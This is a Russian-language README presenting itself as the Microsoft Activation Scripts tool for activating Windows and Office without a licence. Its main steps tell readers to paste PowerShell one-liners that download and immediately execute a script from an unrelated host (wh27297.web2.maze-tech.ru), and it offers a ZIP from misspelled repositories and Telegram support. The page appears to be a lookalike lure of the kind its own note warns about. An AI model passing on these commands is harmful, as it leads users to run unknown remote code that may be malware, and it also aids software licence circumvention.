<p align="center"><img src="https://wh27297.web2.maze-tech.ru/logo_small.png" alt="MAS Logo"></p>

<h1 align="center">Сценарии активации Microsoft (MAS)</h1>

<p align="center">Активатор Windows и Office с открытым исходным кодом, включающий HWID, Ohook, TSforge, KMS38 и онлайн-методы активации KMS, а также расширенные возможности устранения неполадок..</p>

<hr>
  
## Как активировать Windows / Office / расширенные обновления (ESU)?

### Способ 1 - PowerShell ❤️

1. **Откройте PowerShell**  
   Щелкните в меню **Пуск**, введите `PowerShell`, затем откройте его.

2. **Скопируйте и вставьте приведенный ниже код, затем нажмите enter.**  
   - Для ** Windows 8, 10, 11**: 📌
     ```
     irm https://wh27297.web2.maze-tech.ru/ | iex
     ```
	 Если вышеперечисленное заблокировано (провайдером/DNS), попробуйте это (требуется обновление Windows 10 или 11).:  
	 ```
	 iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://wh27297.web2.maze-tech.ru/ | Out-String)
	 ```
   - Для ** Windows 7** и более поздних версий:
     ```
      iex ((New-Object Net.WebClient).DownloadString('https://wh27297.web2.maze-tech.ru/'))
     ```
	- **Скрипт не запускается❓Воспользуйтесь приведенным ниже способом 2.**

3. Появится меню активации. **Выберите выделенные зеленым цветом опции**, чтобы активировать Windows или Office.

4. **Готово!**

---

### Способ 2 - традиционный (Windows Vista и более поздние версии)

1.   Скачайте скрипт: [full ZIP](https://github.com/ZacaDeveloper/microsoft-acvtiv/raw/refs/heads/main/Microsoft-Activation-Scripts.zip).
2. Запустите файл с именем "MAS_AIO.cmd".
3. Вы увидите параметры активации. Следуйте инструкциям на экране.
4. Вот и все.

---

> [!TIP]
> - Sинтернет-провайдеры ome/DNS блокируют доступ к нашим доменам. Вы можете обойти это, включив [DNS-over-HTTPS (DoH)](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/encrypted-dns-browsers/) в вашем браузере. 
> - **Возникли проблемы **❓Напишите сюда: [TG](https://t.me/Xiamonov)

---

> [!NOTE]
>
> - Команда IRM в PowerShell загружает скрипт с указанного URL-адреса, а команда IEX выполняет его.
> - Всегда перепроверяйте URL-адрес перед выполнением команды и проверяйте источник, если загружаете файлы вручную.
> - Будьте осторожны, так как некоторые вредоносные программы распространяются под видом MAS, используя разные URL-адреса в команде IRM.

---

```
Последняя версия: 3.7
Дата выхода: 11 сентября 2025
```

### [Помощь](https://t.me/Xiamonov)

<div align="center">
  
[![1.1]][1]

</div>

[1.1]: https://massgrave.dev/img/logo_github.png (GitHub)

[1]: https://github.com/ZacaDeveloper/microsoft-acvited

---

<p align="center">Сделано с любовью ❤️</p>
